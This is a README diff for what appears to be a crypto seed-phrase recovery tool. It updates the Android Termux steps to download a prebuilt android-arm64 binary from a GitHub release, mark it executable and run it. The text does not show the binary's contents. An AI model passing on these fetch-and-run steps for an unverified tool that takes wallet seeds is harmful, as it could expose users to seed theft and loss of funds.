@@ -123,15 +123,18 @@ No invoices, no wire transfers, no waiting on a human. It's all on-chain.
 
 This is a desktop tool, but mobile users have options:
 
-**Android** — you can run the real tool on your phone with [Termux](https://f-droid.org/packages/com.termux/) (free):
+**Android** — you can run the real tool on your phone with [Termux](https://f-droid.org/packages/com.termux/) (free). Use the **`android-arm64`** build (built natively for Android — the `linux-arm64` one won't run on a phone):
 
 ```bash
 # inside Termux
 pkg install wget tar
-wget https://github.com/Just-Code-Builder/Crypto-seed-phrase-recovery/releases/latest/download/crypto-seed-recovery-linux-arm64.tar.gz
-tar -xzf crypto-seed-recovery-linux-arm64.tar.gz
+wget https://github.com/Just-Code-Builder/Crypto-seed-phrase-recovery/releases/latest/download/crypto-seed-recovery-android-arm64.tar.gz
+tar -xzf crypto-seed-recovery-android-arm64.tar.gz
+chmod +x crypto-seed-recovery
 ./crypto-seed-recovery
 ```
+
+The service menu opens right in the terminal.
 
 **iPhone / iPad** — iOS has no terminal, so the tool can't run on the device. Use any computer (Windows / Mac / Linux), ideally one that's offline. If you only have a phone, borrow a trusted computer — never type your seed into a website on someone else's machine.
 
